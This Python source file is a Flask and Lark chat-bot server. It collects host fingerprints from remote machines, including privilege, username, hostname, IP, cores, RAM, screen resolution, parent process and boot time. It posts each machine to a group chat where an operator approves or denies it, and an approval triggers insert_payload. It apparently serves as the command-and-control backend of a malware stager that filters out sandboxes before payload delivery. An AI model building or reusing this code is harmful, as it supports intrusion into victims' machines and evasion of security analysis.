import threading
import os
import json
import hashlib

from datetime import datetime, timezone, timedelta
from flask import Flask, request, jsonify
from tools import *
from shared_state import get_index, increment_index, reset_index

import lark_oapi as lark
from lark_oapi.api.im.v1 import *
from lark_oapi.api.application.v6 import *
from lark_oapi.api.drive.v1 import *
from lark_oapi.event.callback.model.p2_card_action_trigger import (
    P2CardActionTrigger,
    P2CardActionTriggerResponse,
)

group_id = os.getenv("GROUP_ID")
PERMISSION_CARD_ID = os.getenv("PERMISSION_CARD_ID")
appid = os.getenv("APP_ID")
app_secret = os.getenv("APP_SECRET")

app = Flask(__name__)

client = lark.Client.builder().app_id(lark.APP_ID).app_secret(lark.APP_SECRET).build()

def send_message(receive_id_type, receive_id, msg_type, content):
    request = (
        CreateMessageRequest.builder()
        .receive_id_type(receive_id_type)
        .request_body(
            CreateMessageRequestBody.builder()
            .receive_id(receive_id)
            .msg_type(msg_type)
            .content(content)
            .build()
        )
        .build()
    )
    response = client.im.v1.message.create(request)
    if not response.success():
        raise Exception(
            f"client.im.v1.message.create failed, code: {response.code}, msg: {response.msg}, log_id: {response.get_log_id()}"
        )
    return response

def send_permission_card(receive_id_type, receive_id, index):
    data_basic_info= fetch_data_basic_info(index)[0]
    send_time, privilege, username, hostname, external_ip = data_basic_info

    data_env_info = fetch_data_env_info(index)[0]
    core_num, ram, resolution, current_path, parent_process, boot_time = data_env_info

    content = json.dumps(
        {
            "type": "template",
            "data": {
                "template_id": PERMISSION_CARD_ID,
                "template_variable": {
                    "send_time": send_time,
                    "privilege": privilege,
                    "username": username,
                    "hostname": hostname,
                    "external_ip": external_ip,
                    "index": index,
                    "core_num": core_num,
                    "ram": ram,
                    "resolution": resolution,
                    "current_path": current_path,
                    "parent_process": parent_process,
                    "boot_time": boot_time,
                },
            },
        }
    )
    return send_message(receive_id_type, receive_id, "interactive", content)

recent_send_times = set()

def do_p2_drive_file_edit_v1(data: lark.drive.v1.P2DriveFileEditV1) -> None:
    index = get_index()
    recv_data = fetch_data_basic_info(index)[0]
    send_time = recv_data[0]
    if send_time in recent_send_times:
        return        
    
    recent_send_times.add(send_time)

    # 防抖动
    try:
        send_permission_card("chat_id", group_id, index)
        increment_index()
    except:
        pass
processed_indices = set()

def do_card_action_trigger(data: P2CardActionTrigger) -> P2CardActionTriggerResponse:
    recv_data = json.loads(lark.JSON.marshal(data))
    action = recv_data["event"]["action"]["value"]["action"]
    
    index = int(recv_data["event"]["action"]["value"]["index"])

    # 不知道怎么禁用按钮 就后端处理了
    if index in processed_indices:
        return
    processed_indices.add(index)

    if action == "access":
        insert_payload(index, True)
        resp = {
            "toast": {
                "type": "success",
                "content": "已准入",
                "card":{
                    "type": "template",
                    "data": {
                        "template_id": PERMISSION_CARD_ID,
                        "template_variable": {
                            "button_is_disabled": True,
                        },
                    },
                }
            }
        }
    elif action == "deny":
        insert_payload(index, False)

        resp = {
            "toast": {
                "type": "success",
                "content": "已拒绝",
                "card":{ 
                    "type": "template",
                    "data": {
                        "template_id": PERMISSION_CARD_ID,
                        "template_variable": {
                            "button_is_disabled": True,
                        },
                    },
                }
            }
        }

    return P2CardActionTriggerResponse(resp)

event_handler = (
    lark.EventDispatcherHandler.builder("", "")
    .register_p2_drive_file_edit_v1(do_p2_drive_file_edit_v1)
    .register_p2_card_action_trigger(do_card_action_trigger) 
    .build()
)

wsClient = lark.ws.Client(
    lark.APP_ID,
    lark.APP_SECRET,
    event_handler=event_handler,
    log_level=lark.LogLevel.DEBUG,
)
hash_to_index = {}

@app.route('/put_basic_info', methods=['POST'])
def put_basic_info():
    try:
        raw_data = request.data.decode('utf-8') 
        json_data = json.loads(raw_data)  
        index = get_index()

        send_time = json_data["send_time"]
        hash_value = hashlib.md5(f"{send_time}".encode()).hexdigest()
        hash_to_index[hash_value] = index

        insert_data_basic_info(index, json_data["send_time"], json_data["privilege"], json_data["username"], json_data["hostname"], request.remote_addr)

        return jsonify({"status": "ok", "received": json_data})
    except Exception as e:
        print("Error parsing JSON:", str(e))
        return jsonify({"status": "error", "msg": str(e)}), 400

@app.route('/put_env_info', methods=['POST'])
def put_env_info():
    try:
        raw_data = request.data.decode('utf-8') 
        json_data = json.loads(raw_data)  
        index = get_index()

        insert_data_env_info(index, json_data["core_num"], json_data["ram"], json_data["resolution"], json_data["current_path"], json_data["parent_process"], json_data["boot_time"])

        return jsonify({"status": "ok", "received": json_data})

    except Exception as e:
        print("Error parsing JSON:", str(e))
        return jsonify({"status": "error", "msg": str(e)}), 400



@app.route('/get_index_by_hash', methods=['GET'])
def get_index_by_hash():
    try:
        hash_value = request.args.get('hash_value')
        if not hash_value:
            return jsonify({"status": "error", "msg": "缺少 hash_value 参数"}), 400
            
        if hash_value in hash_to_index:
            index = hash_to_index[hash_value]
            print(f"index: {index}")
            return jsonify({"status": "ok", "index": index})
        else:
            return jsonify({"status": "error", "msg": "未找到对应的索引"}), 404
    except Exception as e:
        print("查询索引时出错:", str(e))
        return jsonify({"status": "error", "msg": str(e)}), 500

def run_flask():
    app.run(host='0.0.0.0', port=8000, use_reloader=False)

def run_bot():
    wsClient.start()

def main():
    claer_table()
    reset_index()
    initialize()  
    
    print("Starting application...")
    
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    run_bot()

if __name__ == "__main__":
    main()
